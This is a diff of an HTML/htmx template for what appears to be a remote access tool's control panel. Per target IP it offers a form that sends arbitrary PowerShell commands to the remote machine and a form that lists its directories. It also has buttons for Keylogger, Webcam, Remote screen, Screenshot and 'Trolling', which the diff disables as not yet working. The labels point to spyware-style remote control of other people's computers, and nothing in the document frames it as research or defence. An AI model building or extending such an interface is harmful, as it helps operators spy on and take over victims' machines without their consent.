@@ -5,7 +5,7 @@
     </h2>
 
     <form
-        hx-post="/run_command/{{ ip }}"
+        hx-post="/command/run/{{ ip }}"
         hx-target="#command-output-{{ ip }}"
         hx-swap="innerHTML"
         class="space-y-4 mb-6"
@@ -16,7 +16,6 @@
             placeholder="powershell -Command Get-Process"
             class="w-full p-3 bg-gray-900 rounded border border-gray-600 focus:outline-none focus:border-blue-500 transition"
         />
-
         <button
             type="submit"
             class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-4 rounded transition"
@@ -25,45 +24,61 @@
         </button>
     </form>
 
-    <div class="grid grid-cols-2 sm:grid-cols-3 gap-4">
-        <button
-            class="bg-indigo-600 hover:bg-indigo-700 p-3 rounded transition"
+    <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+        <form
+            hx-post="/fs/list/{{ ip }}"
+            hx-target="#command-output-{{ ip }}"
+            hx-swap="innerHTML"
+            class="col-span-1 md:col-span-2 space-y-2"
         >
-            File Manager
-        </button>
+            <input
+                type="text"
+                name="path"
+                value="C:\"
+                placeholder="Enter path, e.g., C:\"
+                class="w-full p-3 bg-gray-900 rounded border border-gray-600 focus:outline-none focus:border-blue-500 transition"
+            />
+            <button
+                type="submit"
+                class="w-full bg-indigo-600 hover:bg-indigo-700 p-3 rounded transition"
+            >
+                List Directory
+            </button>
+        </form>
+
         <button
-            class="bg-indigo-600 hover:bg-indigo-700 p-3 rounded transition"
+            class="bg-indigo-600 hover:bg-indigo-700 p-3 rounded transition opacity-50 cursor-not-allowed"
         >
             Screenshot
         </button>
         <button
-            class="bg-indigo-600 hover:bg-indigo-700 p-3 rounded transition"
+            class="bg-indigo-600 hover:bg-indigo-700 p-3 rounded transition opacity-50 cursor-not-allowed"
         >
             Chat
         </button>
         <button
-            class="bg-indigo-600 hover:bg-indigo-700 p-3 rounded transition"
+            class="bg-indigo-600 hover:bg-indigo-700 p-3 rounded transition opacity-50 cursor-not-allowed"
         >
             Keylogger
         </button>
         <button
-            class="bg-indigo-600 hover:bg-indigo-700 p-3 rounded transition"
+            class="bg-indigo-600 hover:bg-indigo-700 p-3 rounded transition opacity-50 cursor-not-allowed"
         >
             Remote screen
         </button>
-
         <button
-            class="bg-indigo-600 hover:bg-indigo-700 p-3 rounded transition"
+            class="bg-indigo-600 hover:bg-indigo-700 p-3 rounded transition opacity-50 cursor-not-allowed"
         >
             Task Manager
         </button>
-
         <button
-            class="bg-indigo-600 hover:bg-indigo-700 p-3 rounded transition"
+            class="bg-indigo-600 hover:bg-indigo-700 p-3 rounded transition opacity-50 cursor-not-allowed"
         >
             Webcam
         </button>
-        <button class="bg-red-600 hover:bg-red-700 p-3 rounded transition">
+        <button
+            class="bg-red-600 hover:bg-red-700 p-3 rounded transition opacity-50 cursor-not-allowed"
+        >
             Trolling
         </button>
     </div>
